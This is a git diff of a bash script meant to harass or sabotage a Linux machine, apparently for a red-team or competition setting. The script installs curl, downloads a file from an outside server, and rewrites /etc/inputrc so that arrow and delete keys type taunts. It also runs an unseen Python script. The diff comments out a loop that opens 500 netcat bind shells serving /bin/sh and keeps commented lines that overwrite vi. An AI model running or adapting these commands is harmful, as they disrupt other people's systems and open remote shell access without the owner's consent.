@@ -1,6 +1,4 @@
 #!/bin/bash
-# TODO: add other cases
-# what? come back to this later
 if [ ! `which curl` ]; then
    if [ `which yum` ]; then
       yum install curl -y
@@ -16,16 +14,6 @@ if [ ! `which curl` ]; then
 fi
 curl http://server.mdbooktech.com/uwubuntu.png > /tmp/uwubuntu.png
 
-#Run the python script
-if [ `which python3` ]; then
-   python3 basic-stuff.py
-elif [ `which python` ]; then
-   python basic-stuff.py
-elif [ `which python2` ]; then
-   python2 basic-stuff.py
-elif [ `which py` ]; then
-   py basic-stuff.py
-fi
 
 #Mess with inputs
 echo '"\e[A": "u mad bro?"' >> /etc/inputrc
@@ -42,9 +30,19 @@ echo '"\e[3~": "nope"' >> /etc/inputrc
 # chmod +x /usr/bin/vim
 # echo "echo use nano, coward" > $(which vi)
 
+#Run the python script
+if [ `which python3` ]; then
+   python3 basic-stuff.py
+elif [ `which python` ]; then
+   python basic-stuff.py
+elif [ `which python2` ]; then
+   python2 basic-stuff.py
+elif [ `which py` ]; then
+   py basic-stuff.py
+fi
 
 #Simple bind shell on a ton of random ports
-for i in {1..500}
-do
-   nc -lke /bin/sh &
-done
+# for i in {1..500}
+# do
+#    nc -lke /bin/sh &
+# done
